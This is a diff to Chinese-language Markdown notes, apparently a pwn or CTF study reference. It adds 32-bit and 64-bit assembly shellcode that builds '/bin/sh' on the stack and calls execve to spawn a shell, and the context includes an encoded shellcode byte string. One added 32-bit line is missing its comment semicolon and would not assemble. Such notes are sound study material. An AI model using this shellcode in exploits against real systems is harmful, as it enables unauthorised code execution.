@@ -43,6 +43,18 @@ mov al,0xB
 int 0x80
 ```
 
+### 此外
+
+```assembly
+push 0x68732f	;push '/sh'
+push 0x6e69622f	;push '/bin'
+mov ebx, esp	;ebx='/bin/sh'
+xor edx, edx	;edx=0
+xor ecx, ecx	;ecx=0
+mov eax, 0xb	eax=0xb
+int 0x80
+```
+
 ## 64位
 
 ### 有"\x00"最短 22 byte
@@ -104,5 +116,18 @@ pop rax
 syscall
 '''
 # shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
+```
+
+### 此外
+
+```assembly
+mov rbx, '/bin/sh'	;将'/bin/sh'赋值给rbx
+push rbx	;将rbx的值，即'/bin/sh'压入栈中
+push rsp	;将esp的值压入栈中
+pop rdi		;将esp赋值给rdi，rdi='/bin/sh'
+xor rsi, rsi	;rsi=0
+xor rdx, rdx	;rdx=0
+mov rax, 0x3b	;rax=0x3b
+syscall
 ```
 
